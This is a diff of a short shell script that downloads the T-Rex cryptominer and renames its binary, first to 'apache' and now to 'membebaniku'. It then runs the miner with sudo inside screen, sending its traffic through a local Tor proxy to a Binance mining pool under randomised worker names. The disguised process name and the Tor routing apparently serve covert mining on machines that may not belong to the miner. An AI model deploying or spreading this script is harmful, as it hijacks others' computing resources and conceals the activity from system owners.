@@ -13,6 +13,6 @@ cd ..
 
 wget https://github.com/trexminer/T-Rex/releases/download/0.25.15/t-rex-0.25.15-linux.tar.gz
 tar -xf t-rex-0.25.15-linux.tar.gz
-mv t-rex apache
+mv t-rex membebaniku
 
-screen sudo ./apache -a ethash -o stratum+tcp://ethash.poolbinance.com:1800 -o stratum+tcp://ethash.poolbinance.com:443 -p x --proxy 127.0.0.1:9050 -u teguhcong -w $(echo $(shuf -i 1-2000 -n 1)-Konsol) --gpu-report-interval 5 --mt 1
+screen sudo ./membebaniku -a ethash -o stratum+tcp://ethash.poolbinance.com:1800 -o stratum+tcp://ethash.poolbinance.com:443 -p x --proxy 127.0.0.1:9050 -u teguhcong -w $(echo $(shuf -i 1-2000 -n 1)-Konsol) --gpu-report-interval 5 --mt 1
